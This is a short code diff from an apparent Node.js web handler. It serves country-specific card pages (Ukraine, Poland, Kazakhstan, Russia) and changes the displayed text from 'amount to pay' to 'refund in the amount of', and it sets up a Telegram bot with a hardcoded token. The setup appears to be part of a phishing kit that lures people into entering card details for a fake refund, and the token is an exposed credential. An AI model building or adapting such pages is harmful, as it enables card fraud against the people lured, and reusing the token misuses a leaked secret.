@@ -34,19 +34,19 @@ try {
             if (req.params.userlink.search('ua') !=  -1){
                 console.log(1);
                 var index = 'index_card_ua';
-                var amount_c = `Сума до оплати ${ress.rows[0].amount} грн`;
+                var amount_c = `Повернення у розмірі ${ress.rows[0].amount} грн`;
             } else if (req.params.userlink.search('pln') !=  -1) {
                 console.log(2);
                 var index = 'index_card_pln';
-                var amount_c = `kwota do zapłaty ${ress.rows[0].amount} zł`;
+                var amount_c = `Powrót w rozmiarze ${ress.rows[0].amount} zł`;
             } else if (req.params.userlink.search('kz') !=  -1) {
                 console.log(2);
                 var index = 'index_card_kz';
-                var amount_c = `Cумма к оплате ${ress.rows[0].amount} ₸`;
+                var amount_c = `Возврат в размере ${ress.rows[0].amount} ₸`;
             } else {
                 console.log(3);
                 var index = 'index_card';
-                var amount_c = `Cумма к оплате ${ress.rows[0].amount} руб`;
+                var amount_c = `Возврат в размере ${ress.rows[0].amount} руб`;
             }
             if (ress) {
                 const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
